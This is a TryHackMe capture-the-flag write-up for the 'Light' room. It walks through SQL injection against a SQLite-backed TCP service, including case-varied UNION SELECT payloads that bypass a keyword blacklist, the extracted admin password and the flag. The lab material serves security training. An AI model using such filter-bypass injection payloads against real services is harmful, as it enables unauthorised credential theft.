# Light - TryHackMe

## Challenge Information

- Platform: TryHackMe  
- Room: Light  
- Category: Web / SQL Injection / Filter Bypass / SQLite

---

## Objective

Exploit a SQL injection vulnerability in a custom TCP database service running on port `1337` to retrieve administrative credentials and obtain the final flag.

---

## Reconnaissance

The target service was accessible via:

    nc <target-ip> 1337

Initial banner:

    Welcome to the Light database!
    Please enter your username:

The service operated as a simple username lookup interface over a TCP connection.

---

## Enumeration

### Initial Behavior

Entering a known username:

    smokey

Returned:

    Password: vYQ5ngPpw8AdUmL

Followed by a repeat prompt:

    Please enter your username:

This indicated a stateless query-response system performing database lookups per request.

---

## Vulnerability Discovery

### SQL Injection Indicator

Injecting special characters produced a database error:

    Error: unrecognized token: ""\-%*' LIMIT 30"

This strongly suggested unsafe SQL query construction.

---

### Input Filtering

Further testing revealed a blacklist filter blocking:

- `SELECT`
- `UNION`
- `--`
- `/*`
- `%0b`

Response:

    Ahh there is a word in there I don't like :(

This confirmed a keyword-based input filter rather than proper parameterization.

---

## Analysis

The backend was identified as:

- SQLite version 3.31.1

The application was vulnerable to:

> Filtered UNION-based SQL Injection in a username lookup query

Likely query structure:

    SELECT password FROM admintable WHERE username = '<input>';

---

## Exploitation

### Step 1: Confirm SQL Injection

A valid bypass technique was used to avoid blocked keywords via case variation and syntax manipulation.

---

### Step 2: Schema Enumeration

The SQLite schema was accessed via:

    sqlite_master

This allowed identification of the table:

    admintable

---

### Step 3: Column Discovery

Attempts revealed:

- invalid column access caused SQL errors
- valid column identified: `username`
- inferred column: `password`

---

### Step 4: Targeted Data Extraction

Admin credentials were extracted using a conditional UNION-based query:

    1' uNion sEleCt password from admintable where username = 'TryHackMeAdmin

Response:

    Password: mamZtAuMlrsEy5bp6q17

---

### Step 5: Final Flag Retrieval

Using the same injection structure, the database value corresponding to the flag was retrieved:

    1' uNion sEleCt password from admintable '1

Response:

    Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}

---

## Flag

    THM{SQLit3_InJ3cTion_is_SimplE_nO?}

---

## Lessons Learned

- Custom TCP services can expose SQL injection vulnerabilities outside traditional web contexts.
- Blacklist-based filtering is insufficient protection against SQL injection.
- SQLite schema tables (`sqlite_master`) are critical for enumeration.
- UNION-based SQL injection remains effective even under restricted keyword environments when carefully constructed.
- Systematic schema discovery is more reliable than guessing payloads.

---

## Key Takeaways

- Always test input handling even in non-web services (e.g., raw TCP applications).
- Filtering keywords does not prevent SQL injection if logic structure is still injectable.
- SQLite environments are common in lightweight CTF services.
- Schema enumeration is the foundation of successful SQL injection exploitation.
